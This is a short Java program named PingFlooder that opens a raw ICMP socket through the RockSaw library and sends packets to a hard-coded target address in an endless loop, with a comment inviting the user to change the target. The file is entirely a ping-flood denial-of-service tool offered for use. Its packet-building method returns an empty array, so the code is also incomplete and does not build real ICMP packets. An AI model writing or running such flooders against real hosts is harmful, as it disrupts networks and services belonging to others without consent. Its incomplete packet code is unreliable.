
package rocksaw;
import com.savarese.rocksaw.net.RawSocket;
import java.io.IOException;

import java.net.InetAddress;
import java.net.UnknownHostException;

public class PingFlooder {
  public static void main(String[] args) {
    try {
      // Set the target IP address (modify as needed)
      String targetIpAddress = "192.168.0.101";
      InetAddress targetAddress = InetAddress.getByName(targetIpAddress);


      RawSocket socket = new RawSocket();


      socket.open(RawSocket.PF_INET, RawSocket.getProtocolByName("icmp"));


      while (true) {

        byte[] packetData = createPingPacketData();

        
        socket.write(InetAddress.getByAddress(targetAddress.getAddress()), packetData, 0, packetData.length);
      }
    } catch (UnknownHostException e) {
      e.printStackTrace();
    } catch (IOException e) {
      throw new RuntimeException("Error", e);
    }
  }
  private static byte[] createPingPacketData() {

    return new byte[]{};
  }
}
